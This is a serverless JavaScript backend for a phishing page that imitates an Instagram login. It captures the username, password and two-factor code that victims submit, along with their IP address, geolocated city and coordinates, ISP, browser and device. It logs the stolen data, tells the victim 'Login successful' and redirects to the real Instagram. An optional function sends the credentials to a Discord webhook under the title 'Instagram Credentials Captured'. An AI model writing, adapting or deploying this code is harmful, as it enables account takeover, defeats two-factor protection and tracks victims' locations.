export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, twofa } = req.body || {};

    // Get IP address from Vercel headers
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || 'unknown';

    // Get browser details from User-Agent
    const userAgent = req.headers['user-agent'] || 'unknown';

    // Parse browser details
    const browserInfo = parseUserAgent(userAgent);

    // Get geolocation from IP (using free ip-api.com - no key required)
    let geo = { city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: '0', lon: '0' };
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
      const geoData = await geoRes.json();
      if (geoData.status === 'success') {
        geo = {
          city: geoData.city || 'Unknown',
          region: geoData.regionName || 'Unknown',
          country: geoData.country || 'Unknown',
          lat: geoData.lat || '0',
          lon: geoData.lon || '0',
          query: geoData.query || ip,
          isp: geoData.isp || 'Unknown',
          org: geoData.org || 'Unknown'
        };
      }
    } catch (geoErr) {
      // Geolocation failed, use defaults
    }

    // Compile all captured data
    const capturedData = {
      timestamp: new Date().toISOString(),
      ip,
      geo,
      browser: browserInfo,
      credentials: {
        username: username || 'Not provided',
        password: password || 'Not provided',
        twofa: twofa || 'Not provided'
      },
      headers: {
        'accept': req.headers['accept'] || 'unknown',
        'accept-language': req.headers['accept-language'] || 'unknown',
        'accept-encoding': req.headers['accept-encoding'] || 'unknown',
        'sec-ch-ua': req.headers['sec-ch-ua'] || 'unknown',
        'sec-ch-ua-platform': req.headers['sec-ch-ua-platform'] || 'unknown',
        'sec-ch-ua-mobile': req.headers['sec-ch-ua-mobile'] || 'unknown',
        'referer': req.headers['referer'] || 'unknown',
        'origin': req.headers['origin'] || 'unknown',
        'dnt': req.headers['dnt'] || 'unknown'
      }
    };

    // Log to console (visible in Vercel logs)
    console.log('=== CAPTURED DATA ===');
    console.log(JSON.stringify(capturedData, null, 2));
    console.log('=====================');

    // You can add a webhook to send this data to Discord/Telegram/etc.
    // Example: sendToDiscord(capturedData);
    // Example: sendToTelegram(capturedData);

    // Return success to the client
    return res.status(200).json({
      success: true,
      message: 'Login successful',
      // Redirect to real Instagram after "login"
      redirect: 'https://www.instagram.com'
    });

  } catch (error) {
    console.error('Capture error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}

function parseUserAgent(ua) {
  const info = {
    raw: ua,
    browser: 'Unknown',
    version: 'Unknown',
    os: 'Unknown',
    device: 'Unknown',
    isMobile: false
  };

  // Browser detection
  if (ua.includes('Firefox/')) {
    info.browser = 'Firefox';
    const match = ua.match(/Firefox\/([\d.]+)/);
    if (match) info.version = match[1];
  } else if (ua.includes('Edg/')) {
    info.browser = 'Edge';
    const match = ua.match(/Edg\/([\d.]+)/);
    if (match) info.version = match[1];
  } else if (ua.includes('Chrome/')) {
    info.browser = 'Chrome';
    const match = ua.match(/Chrome\/([\d.]+)/);
    if (match) info.version = match[1];
  } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
    info.browser = 'Safari';
    const match = ua.match(/Version\/([\d.]+)/);
    if (match) info.version = match[1];
  }

  // OS detection
  if (ua.includes('Windows NT 10.0')) info.os = 'Windows 10';
  else if (ua.includes('Windows NT 11.0')) info.os = 'Windows 11';
  else if (ua.includes('Windows NT 6.3')) info.os = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.1')) info.os = 'Windows 7';
  else if (ua.includes('Mac OS X')) {
    const match = ua.match(/Mac OS X ([\d_]+)/);
    info.os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
  } else if (ua.includes('Android')) {
    info.os = 'Android';
    info.isMobile = true;
    const match = ua.match(/Android ([\d.]+)/);
    if (match) info.os = `Android ${match[1]}`;
  } else if (ua.includes('iPhone') || ua.includes('iPad')) {
    info.os = ua.includes('iPhone') ? 'iOS (iPhone)' : 'iOS (iPad)';
    info.isMobile = true;
    const match = ua.match(/OS ([\d_]+)/);
    if (match) info.os = `iOS ${match[1].replace(/_/g, '.')}`;
  } else if (ua.includes('Linux')) {
    info.os = 'Linux';
  }

  // Device detection
  if (ua.includes('iPhone')) info.device = 'iPhone';
  else if (ua.includes('iPad')) info.device = 'iPad';
  else if (ua.includes('Android')) {
    info.device = 'Android Device';
    info.isMobile = true;
  } else if (ua.includes('Windows')) info.device = 'Windows PC';
  else if (ua.includes('Macintosh')) info.device = 'Mac';
  else if (ua.includes('Linux')) info.device = 'Linux PC';

  return info;
}

// Optional: Send to Discord webhook
async function sendToDiscord(data) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) return;

  const embed = {
    title: 'Instagram Credentials Captured',
    color: 0xE1306C,
    fields: [
      { name: 'Username', value: data.credentials.username, inline: true },
      { name: 'Password', value: data.credentials.password, inline: true },
      { name: '2FA Code', value: data.credentials.twofa || 'Not provided', inline: true },
      { name: 'IP Address', value: data.ip, inline: true },
      { name: 'Location', value: `${data.geo.city}, ${data.geo.region}, ${data.geo.country}`, inline: true },
      { name: 'Coordinates', value: `Lat: ${data.geo.lat}, Lon: ${data.geo.lon}`, inline: true },
      { name: 'ISP', value: data.geo.isp || 'Unknown', inline: true },
      { name: 'Browser', value: `${data.browser.browser} ${data.browser.version}`, inline: true },
      { name: 'OS', value: data.browser.os, inline: true },
      { name: 'Device', value: data.browser.device, inline: true },
      { name: 'Timestamp', value: data.timestamp, inline: false }
    ]
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {
    console.error('Discord webhook failed:', e);
  }
}